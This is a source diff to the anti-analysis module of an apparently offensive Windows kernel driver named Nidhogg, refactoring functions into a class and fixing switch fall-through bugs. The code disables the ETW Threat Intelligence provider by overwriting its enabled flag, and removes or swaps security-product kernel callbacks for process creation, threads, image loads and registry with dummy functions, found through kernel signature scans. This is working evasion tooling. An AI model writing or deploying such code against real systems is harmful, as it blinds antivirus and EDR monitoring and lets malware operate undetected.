@@ -1,6 +1,22 @@
 #include "pch.h"
 #include "AntiAnalysis.hpp"
 
+AntiAnalysis::AntiAnalysis() {
+	this->PrevEtwTiValue = 0;
+	this->DisabledCallbacksCount = 0;
+
+	memset(this->DisabledCallbacks, 0, sizeof(this->DisabledCallbacks));
+	this->DisabledCallbacksCount = 0;
+
+	this->Lock.Init();
+}
+
+AntiAnalysis::~AntiAnalysis() {
+	AutoLock locker(this->Lock);
+	memset(this->DisabledCallbacks, 0, sizeof(this->DisabledCallbacks));
+	this->DisabledCallbacksCount = 0;
+}
+
 /*
 * Description:
 * EnableDisableEtwTI is responsible to enable or disable ETWTI.
@@ -11,7 +27,7 @@
 * Returns:
 * @status	[NTSTATUS] -- Whether successfuly enabled or disabled.
 */
-NTSTATUS EnableDisableEtwTI(bool enable) {
+NTSTATUS AntiAnalysis::EnableDisableEtwTI(bool enable) {
 	NTSTATUS status = STATUS_SUCCESS;
 	EX_PUSH_LOCK etwThreatIntLock = NULL;
 	ULONG foundIndex = 0;
@@ -23,14 +39,14 @@ NTSTATUS EnableDisableEtwTI(bool enable) {
 		return STATUS_INSUFFICIENT_RESOURCES;
 	RtlCopyMemory(etwThreatIntProvRegHandleSig, EtwThreatIntProvRegHandleSignature1, etwThreatIntProvRegHandleSigLen);
 
-	AutoLock lock(aaGlobals.Lock);
+	AutoLock lock(this->Lock);
 	PVOID searchedRoutineAddress = (PVOID)KeInsertQueueApc;
 	SIZE_T targetFunctionDistance = EtwThreatIntProvRegHandleDistance;
-	PLONG searchedRoutineOffset = (PLONG)FindPattern((PCUCHAR)etwThreatIntProvRegHandleSig, 0xCC, etwThreatIntProvRegHandleSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);
+	PLONG searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)etwThreatIntProvRegHandleSig, 0xCC, etwThreatIntProvRegHandleSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);
 
 	if (!searchedRoutineOffset) {
 		RtlCopyMemory(etwThreatIntProvRegHandleSig, EtwThreatIntProvRegHandleSignature2, etwThreatIntProvRegHandleSigLen);
-		searchedRoutineOffset = (PLONG)FindPattern((PCUCHAR)etwThreatIntProvRegHandleSig, 0xCC, etwThreatIntProvRegHandleSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);
+		searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)etwThreatIntProvRegHandleSig, 0xCC, etwThreatIntProvRegHandleSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);
 
 		if (!searchedRoutineOffset) {
 			status = STATUS_NOT_FOUND;
@@ -53,12 +69,12 @@ NTSTATUS EnableDisableEtwTI(bool enable) {
 	}
 
 	if (enable) {
-		MmCopyVirtualMemory(PsGetCurrentProcess(), &aaGlobals.PrevEtwTiValue, PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, sizeof(ULONG), KernelMode, &bytesWritten);
-		aaGlobals.PrevEtwTiValue = 0;
+		MmCopyVirtualMemory(PsGetCurrentProcess(), &this->PrevEtwTiValue, PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, sizeof(ULONG), KernelMode, &bytesWritten);
+		this->PrevEtwTiValue = 0;
 	}
 	else {
 		ULONG disableEtw = 0;
-		status = KeReadProcessMemory(PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, &aaGlobals.PrevEtwTiValue, sizeof(ULONG), KernelMode);
+		status = NidhoggMemoryUtils->KeReadProcessMemory(PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, &this->PrevEtwTiValue, sizeof(ULONG), KernelMode);
 
 		if (NT_SUCCESS(status))
 			status = MmCopyVirtualMemory(PsGetCurrentProcess(), &disableEtw, PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, sizeof(ULONG), KernelMode, &bytesWritten);
@@ -83,11 +99,11 @@ Cleanup:
 * Returns:
 * @status	[NTSTATUS]		  -- Whether successfuly restored or not.
 */
-NTSTATUS RestoreCallback(KernelCallback* Callback) {
+NTSTATUS AntiAnalysis::RestoreCallback(KernelCallback* Callback) {
 	DisabledKernelCallback callback{};
 	NTSTATUS status = STATUS_NOT_FOUND;
 
-	AutoLock locker(aaGlobals.Lock);
+	AutoLock locker(this->Lock);
 	status = RemoveDisabledCallback(Callback, &callback);
 
 	if (!NT_SUCCESS(status))
@@ -135,13 +151,17 @@ NTSTATUS RestoreCallback(KernelCallback* Callback) {
 		switch (Callback->Type) {
 		case PsCreateProcessType:
 			replacedFunction = (ULONG64)CreateProcessNotifyDummyFunction;
+			break;
 		case PsCreateProcessTypeEx:
 			replacedFunction = (ULONG64)CreateProcessNotifyExDummyFunction;
+			break;
 		case PsCreateThreadType:
 		case PsCreateThreadTypeNonSystemThread:
 			replacedFunction = (ULONG64)CreateThreadNotifyDummyFunction;
+			break;
 		case PsImageLoadType:
 			replacedFunction = (ULONG64)LoadImageNotifyDummyFunction;
+			break;
 		}
 
 		status = ListPsNotifyRoutines(&routines, Callback->CallbackAddress, replacedFunction);
@@ -166,7 +186,7 @@ NTSTATUS RestoreCallback(KernelCallback* Callback) {
 * Returns:
 * @status	[NTSTATUS]		  -- Whether successfuly removed or not.
 */
-NTSTATUS RemoveCallback(KernelCallback* Callback) {
+NTSTATUS AntiAnalysis::RemoveCallback(KernelCallback* Callback) {
 	DisabledKernelCallback callback{};
 	NTSTATUS status = STATUS_NOT_FOUND;
 
@@ -219,13 +239,17 @@ NTSTATUS RemoveCallback(KernelCallback* Callback) {
 		switch (Callback->Type) {
 		case PsCreateProcessType:
 			replacerFunction = (ULONG64)CreateProcessNotifyDummyFunction;
+			break;
 		case PsCreateProcessTypeEx:
 			replacerFunction = (ULONG64)CreateProcessNotifyExDummyFunction;
+			break;
 		case PsCreateThreadType:
 		case PsCreateThreadTypeNonSystemThread:
 			replacerFunction = (ULONG64)CreateThreadNotifyDummyFunction;
+			break;
 		case PsImageLoadType:
 			replacerFunction = (ULONG64)LoadImageNotifyDummyFunction;
+			break;
 		}
 
 		status = ListPsNotifyRoutines(&routines, replacerFunction, Callback->CallbackAddress);
@@ -242,7 +266,7 @@ NTSTATUS RemoveCallback(KernelCallback* Callback) {
 	}
 
 	if (NT_SUCCESS(status)) {
-		AutoLock locker(aaGlobals.Lock);
+		AutoLock locker(this->Lock);
 		status = AddDisabledCallback(callback);
 	}
 
@@ -261,7 +285,7 @@ NTSTATUS RemoveCallback(KernelCallback* Callback) {
 * Returns:
 * @status		    [NTSTATUS]		 -- Whether successfuly listed or not.
 */
-NTSTATUS ListRegistryCallbacks(CmCallbacksList* Callbacks, ULONG64 ReplacerFunction, ULONG64 ReplacedFunction) {
+NTSTATUS AntiAnalysis::ListRegistryCallbacks(CmCallbacksList* Callbacks, ULONG64 ReplacerFunction, ULONG64 ReplacedFunction) {
 	NTSTATUS status = STATUS_SUCCESS;
 	UCHAR* listHeadSignature = NULL;
 	UCHAR* listHeadCountSignature = NULL;
@@ -284,7 +308,7 @@ NTSTATUS ListRegistryCallbacks(CmCallbacksList* Callbacks, ULONG64 ReplacerFunct
 	PVOID searchedRoutineAddress = (PVOID)CmRegisterCallback;
 	SIZE_T targetFunctionDistance = CmpRegisterCallbackInternalSignatureDistance;
 
-	PLONG searchedRoutineOffset = (PLONG)FindPattern((PCUCHAR)targetFunctionSignature, 0xCC, targetFunctionSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(targetFunctionSigLen - 1));
+	PLONG searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)targetFunctionSignature, 0xCC, targetFunctionSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(targetFunctionSigLen - 1));
 
 	if (!searchedRoutineOffset) {
 		status = STATUS_NOT_FOUND;
@@ -303,7 +327,7 @@ NTSTATUS ListRegistryCallbacks(CmCallbacksList* Callbacks, ULONG64 ReplacerFunct
 	RtlCopyMemory(mainFunctionSignature, CmpInsertCallbackInListByAltitudeSignature, targetFunctionSigLen);
 	targetFunctionDistance = CmpInsertCallbackInListByAltitudeSignatureDistance;
 
-	searchedRoutineOffset = (PLONG)FindPattern((PCUCHAR)mainFunctionSignature, 0xCC, targetFunctionSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(targetFunctionSigLen - 1));
+	searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)mainFunctionSignature, 0xCC, targetFunctionSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(targetFunctionSigLen - 1));
 
 	if (!searchedRoutineOffset) {
 		status = STATUS_NOT_FOUND;
@@ -331,7 +355,7 @@ NTSTATUS ListRegistryCallbacks(CmCallbacksList* Callbacks, ULONG64 ReplacerFunct
 	}
 	RtlCopyMemory(listHeadCountSignature, RoutinesListCountSignature, listHeadCountSignatureLen);
 
-	searchedRoutineOffset = (PLONG)FindPattern((PCUCHAR)listHeadSignature, 0xCC, listHeadSignatureLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)listHeadSignatureLen);
+	searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)listHeadSignature, 0xCC, listHeadSignatureLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)listHeadSignatureLen);
 
 	if (!searchedRoutineOffset) {
 		status = STATUS_NOT_FOUND;
@@ -339,7 +363,7 @@ NTSTATUS ListRegistryCallbacks(CmCallbacksList* Callbacks, ULONG64 ReplacerFunct
 	}
 	PUCHAR callbacksList = (PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + RoutinesListOffset;
 
-	searchedRoutineOffset = (PLONG)FindPattern((PCUCHAR)listHeadCountSignature, 0xCC, listHeadCountSignatureLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(listHeadCountSignatureLen - 1));
+	searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)listHeadCountSignature, 0xCC, listHeadCountSignatureLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(listHeadCountSignatureLen - 1));
 
 	if (!searchedRoutineOffset) {
 		status = STATUS_NOT_FOUND;
@@ -357,7 +381,7 @@ NTSTATUS ListRegistryCallbacks(CmCallbacksList* Callbacks, ULONG64 ReplacerFunct
 	}
 	RtlCopyMemory(callbacksListLockSignature, CmpCallbackListLockSignature, callbacksListLockSignatureLen);
 
-	searchedRoutineOffset = (PLONG)FindPattern((PCUCHAR)callbacksListLockSignature, 0xCC, callbacksListLockSignatureLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(callbacksListLockSignatureLen - 1));
+	searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)callbacksListLockSignature, 0xCC, callbacksListLockSignatureLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(callbacksListLockSignatureLen - 1));
 
 	if (!searchedRoutineOffset) {
 		status = STATUS_NOT_FOUND;
@@ -412,7 +436,7 @@ Cleanup:
 * Returns:
 * @status		    [NTSTATUS]		 -- Whether successfuly listed or not.
 */
-NTSTATUS ListPsNotifyRoutines(PsRoutinesList* Callbacks, ULONG64 ReplacerFunction, ULONG64 ReplacedFunction) {
+NTSTATUS AntiAnalysis::ListPsNotifyRoutines(PsRoutinesList* Callbacks, ULONG64 ReplacerFunction, ULONG64 ReplacedFunction) {
 	NTSTATUS status = STATUS_SUCCESS;
 	PVOID searchedRoutineAddress = NULL;
 	UCHAR* targetFunctionSignature = NULL;
@@ -509,7 +533,7 @@ NTSTATUS ListPsNotifyRoutines(PsRoutinesList* Callbacks, ULONG64 ReplacerFunctio
 	RtlCopyMemory(listCountSignature, RoutinesListCountSignature, listCountSigLen);
 	countOffset = RoutinesListOffset;
 
-	PLONG searchedRoutineOffset = (PLONG)FindPattern((PCUCHAR)targetFunctionSignature, 0xCC, targetFunctionSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(targetFunctionSigLen - 1));
+	PLONG searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)targetFunctionSignature, 0xCC, targetFunctionSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(targetFunctionSigLen - 1));
 
 	if (!searchedRoutineOffset) {
 		status = STATUS_NOT_FOUND;
@@ -518,7 +542,7 @@ NTSTATUS ListPsNotifyRoutines(PsRoutinesList* Callbacks, ULONG64 ReplacerFunctio
 
 	searchedRoutineAddress = (PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + CallFunctionOffset;
 
-	PLONG routinesListOffset = (PLONG)FindPattern((PCUCHAR)listSignature, 0xCC, listSigLen - 1, searchedRoutineAddress, listDistance, &foundIndex, (ULONG)listSigLen);
+	PLONG routinesListOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)listSignature, 0xCC, listSigLen - 1, searchedRoutineAddress, listDistance, &foundIndex, (ULONG)listSigLen);
 
 	if (!routinesListOffset) {
 		status = STATUS_NOT_FOUND;
@@ -527,7 +551,7 @@ NTSTATUS ListPsNotifyRoutines(PsRoutinesList* Callbacks, ULONG64 ReplacerFunctio
 
 	PUCHAR routinesList = (PUCHAR)searchedRoutineAddress + *(routinesListOffset)+foundIndex + RoutinesListOffset;
 
-	PLONG routinesLengthOffset = (PLONG)FindPattern((PCUCHAR)listCountSignature, 0xCC, listCountSigLen - 1, searchedRoutineAddress, listDistance, &foundIndex, (ULONG)(listCountSigLen - 1));
+	PLONG routinesLengthOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)listCountSignature, 0xCC, listCountSigLen - 1, searchedRoutineAddress, listDistance, &foundIndex, (ULONG)(listCountSigLen - 1));
 
 	if (!routinesLengthOffset) {
 		status = STATUS_NOT_FOUND;
@@ -580,7 +604,7 @@ Cleanup:
 * Returns:
 * @status	 [NTSTATUS]			-- Whether successfuly listed or not.
 */
-NTSTATUS ListObCallbacks(ObCallbacksList* Callbacks) {
+NTSTATUS AntiAnalysis::ListObCallbacks(ObCallbacksList* Callbacks) {
 	NTSTATUS status = STATUS_SUCCESS;
 	PFULL_OBJECT_TYPE objectType = NULL;
 	CHAR driverName[MAX_DRIVER_PATH] = { 0 };
@@ -649,7 +673,7 @@ NTSTATUS ListObCallbacks(ObCallbacksList* Callbacks) {
 * Returns:
 * @status	  [NTSTATUS] -- Whether successfuly matched or not.
 */
-NTSTATUS MatchCallback(PVOID callack, CHAR driverName[MAX_DRIVER_PATH]) {
+NTSTATUS AntiAnalysis::MatchCallback(PVOID callack, CHAR driverName[MAX_DRIVER_PATH]) {
 	NTSTATUS status = STATUS_SUCCESS;
 	PRTL_PROCESS_MODULES info = NULL;
 	ULONG infoSize;
@@ -701,15 +725,15 @@ CleanUp:
 * Returns:
 * @status	  [NTSTATUS]			   -- STATUS_SUCCESS if succeeded else the error.
 */
-NTSTATUS AddDisabledCallback(DisabledKernelCallback Callback) {
+NTSTATUS AntiAnalysis::AddDisabledCallback(DisabledKernelCallback Callback) {
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
 
 	for (int i = 0; i < MAX_KERNEL_CALLBACKS; i++) {
-		if (!aaGlobals.DisabledCallbacks[i].CallbackAddress) {
-			aaGlobals.DisabledCallbacks[i].CallbackAddress = Callback.CallbackAddress;
-			aaGlobals.DisabledCallbacks[i].Entry = Callback.Entry;
-			aaGlobals.DisabledCallbacks[i].Type = Callback.Type;
-			aaGlobals.DisabledCallbacksCount++;
+		if (!this->DisabledCallbacks[i].CallbackAddress) {
+			this->DisabledCallbacks[i].CallbackAddress = Callback.CallbackAddress;
+			this->DisabledCallbacks[i].Entry = Callback.Entry;
+			this->DisabledCallbacks[i].Type = Callback.Type;
+			this->DisabledCallbacksCount++;
 			status = STATUS_SUCCESS;
 			break;
 		}
@@ -729,15 +753,15 @@ NTSTATUS AddDisabledCallback(DisabledKernelCallback Callback) {
 * Returns:
 * @status			  [NTSTATUS]		  -- STATUS_SUCCESS if succeeded else the error.
 */
-NTSTATUS RemoveDisabledCallback(KernelCallback* Callback, DisabledKernelCallback* DisabledCallback) {
+NTSTATUS AntiAnalysis::RemoveDisabledCallback(KernelCallback* Callback, DisabledKernelCallback* DisabledCallback) {
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
 
-	for (ULONG i = 0; i < aaGlobals.DisabledCallbacksCount; i++) {
-		if (aaGlobals.DisabledCallbacks[i].CallbackAddress == Callback->CallbackAddress) {
-			DisabledCallback->CallbackAddress = aaGlobals.DisabledCallbacks[i].CallbackAddress;
-			DisabledCallback->Entry = aaGlobals.DisabledCallbacks[i].Entry;
-			DisabledCallback->Type = aaGlobals.DisabledCallbacks[i].Type;
-			aaGlobals.DisabledCallbacksCount--;
+	for (ULONG i = 0; i < this->DisabledCallbacksCount; i++) {
+		if (this->DisabledCallbacks[i].CallbackAddress == Callback->CallbackAddress) {
+			DisabledCallback->CallbackAddress = this->DisabledCallbacks[i].CallbackAddress;
+			DisabledCallback->Entry = this->DisabledCallbacks[i].Entry;
+			DisabledCallback->Type = this->DisabledCallbacks[i].Type;
+			this->DisabledCallbacksCount--;
 			status = STATUS_SUCCESS;
 			break;
 		}
